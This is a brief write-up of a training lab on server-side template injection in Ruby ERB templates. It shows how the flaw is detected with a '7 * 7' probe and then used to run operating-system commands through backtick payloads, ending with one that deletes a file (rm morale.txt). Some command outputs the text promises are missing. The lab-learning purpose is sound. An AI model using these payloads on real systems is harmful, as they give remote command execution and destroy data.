I'm going to send this to intruder and fuzz it with the built in fuzz list from intruder.

the template syntax is used by ruby: 

`<%= 7 * 7 %>`  passing this in the message string we can see it is being handled by passing the result to the template:

now lets try craft a payload to be able to exploit this system

since our code is being executed by the OS we can just simply issue commands using `<%= `command`` `%>` 

so issuing `<%= ls %>` results:

to solve lab `<%= `rm morale.txt` %>`
